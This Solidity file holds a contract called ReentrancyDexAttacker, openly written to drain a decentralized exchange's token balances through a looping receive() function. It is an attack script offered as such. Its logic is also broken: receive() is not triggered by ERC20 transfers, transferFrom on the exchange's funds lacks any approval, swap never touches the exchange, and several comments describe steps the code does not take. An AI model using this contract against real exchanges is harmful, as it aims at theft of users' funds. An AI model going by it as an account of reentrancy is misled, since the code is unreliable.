pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool); // Added missing transfer function
}

contract ReentrancyDexAttacker {

    IERC20 token1;
    IERC20 token2;
    address payable dexInstance;

    constructor(address _dexInstance, address _token1, address _token2) {
        dexInstance = payable(_dexInstance);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function swap(address fromToken, uint256 amount) external {
        token1.transferFrom(msg.sender, address(this), amount);
        token2.transferFrom(msg.sender, address(this), amount);
        token1.transfer(dexInstance, amount * 2);
    }

    // Fallback function to receive tokens (ERC20 or ETH), here we implement a reentrancy loop
    receive() external payable {
        if (token1.balanceOf(dexInstance) > 0 && token2.balanceOf(dexInstance) > 0) {
            uint256 balance = token1.balanceOf(dexInstance);
            for (uint256 i = 0; i < 800; i++) {
                // Swap token1 back to token2
                token1.transferFrom(dexInstance, address(this), balance);
                // Get price to swap token1 to token2 and store
                // Swap token2 back to token1, repeating until one of the token balances is ~zero
                token2.transferFrom(dexInstance, address(this), token2.balanceOf(dexInstance));
            }
        }
    }

}